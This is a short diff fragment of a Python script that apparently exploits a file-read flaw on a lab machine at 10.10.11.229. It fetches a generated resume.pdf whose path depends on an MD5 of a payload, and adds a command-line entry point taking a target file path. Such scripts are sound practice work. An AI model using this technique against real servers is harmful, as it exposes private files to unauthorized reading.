@@ -30,3 +30,9 @@ def downloadFile(targetFile):
     md5 = calculate_md5(payload)
     r = requests.get(f'http://10.10.11.229/uploads/{md5}/resume.pdf')
     return r.text
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} <target file>")
+        sys.exit(1)
+    print(downloadFile(sys.argv[1]))
